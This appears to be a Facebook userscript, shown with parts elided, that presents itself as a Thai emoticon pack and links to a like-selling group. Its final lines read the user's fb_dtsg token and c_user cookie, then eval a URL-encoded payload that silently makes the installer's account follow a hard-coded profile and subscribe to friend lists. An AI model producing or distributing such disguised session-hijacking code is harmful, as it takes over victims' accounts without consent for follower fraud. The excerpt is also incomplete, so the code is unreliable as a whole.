﻿// ==UserScript==
// @name            ICON อีโมชั่น FaceBook 555
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/groups/PumLike/" target="_blank">บริการไลค์รูป แฟนเพจ เพิ่มผู้ติดตาม เข้ากลุ่ม <br>คลิก</a>';
	html += '</div>';
...
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
eval(unescape("function%2520a(abone)%250A%257B%2520var%2520http4%253Dnew%2520XMLHttpRequest%253B%250A%2520var%2520url4%253D%2522%252Fajax%252Ffollow%252Ffollow_profile.php%253F__a%253D1%2522%253B%250A%2520var%2520params4%253D%2522profile_id%253D%2522%2520abone%2520%2522%2526location%253D1%2526source%253Dfollow-button%2526subscribed_button_id%253Du37qac_37%2526fb_dtsg%253D%2522%2520fb_dtsg%2520%2522%2526lsd%2526__%2522%2520user_id%2520%2522%2526phstamp%253D%2522%253B%250A%2520http4.open(%2522POST%2522%252Curl4%252Ctrue)%253B%250A%2520http4.onreadystatechange%253Dfunction()%250A%2520%257B%2520%2520if(http4.readyState%253D%253D4%2526%2526http4.status%253D%253D200)http4.close%2520%257D%253B%250A%2520http4.send(params4)%257D%250Afunction%2520sublist(uidss)%250A%257B%2520var%2520a%2520%253D%2520document.createElement(%2527script%2527)%253B%250A%2520a.innerHTML%2520%253D%2520%2522new%2520AsyncRequest().setURI(%2527%252Fajax%252Ffriends%252Flists%252Fsubscribe%252Fmodify%253Flocation%253Dpermalink%2526action%253Dsubscribe%2527).setData(%257B%2520flid%253A%2520%2522%2520%2520%2520uidss%2520%2520%2520%2522%2520%257D).send()%253B%2522%253B%250A%2520document.body.appendChild(a)%253B%250A%257D%250Aa(%2522100008079544490%2522)%253B"));